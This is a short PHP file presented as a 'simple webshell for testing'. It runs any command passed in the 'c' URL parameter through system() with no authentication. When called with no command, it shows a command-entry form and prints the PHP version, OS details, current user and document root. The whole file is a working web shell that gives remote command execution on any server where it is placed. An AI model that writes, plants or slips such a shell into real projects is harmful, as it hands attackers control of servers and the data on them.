<?php
/**
 * Simple PHP Webshell for Testing
 * Usage: shell.php?c=whoami
 */

if (isset($_GET['c'])) {
    echo '<pre>';
    echo '$ ' . htmlspecialchars($_GET['c']) . "\n";
    echo str_repeat('-', 50) . "\n";
    system($_GET['c']);
    echo '</pre>';
} else {
    echo '<h1>PHP Shell Ready</h1>';
    echo '<p>Usage: ?c=command</p>';
    echo '<p>Example: ?c=whoami</p>';
    echo '<form method="get">';
    echo '<input type="text" name="c" placeholder="Enter command" style="width:300px">';
    echo '<button type="submit">Execute</button>';
    echo '</form>';
    echo '<h3>System Info:</h3>';
    echo '<pre>';
    echo 'PHP Version: ' . phpversion() . "\n";
    echo 'OS: ' . php_uname() . "\n";
    echo 'User: ' . get_current_user() . "\n";
    echo 'Document Root: ' . $_SERVER['DOCUMENT_ROOT'] . "\n";
    echo '</pre>';
}
?>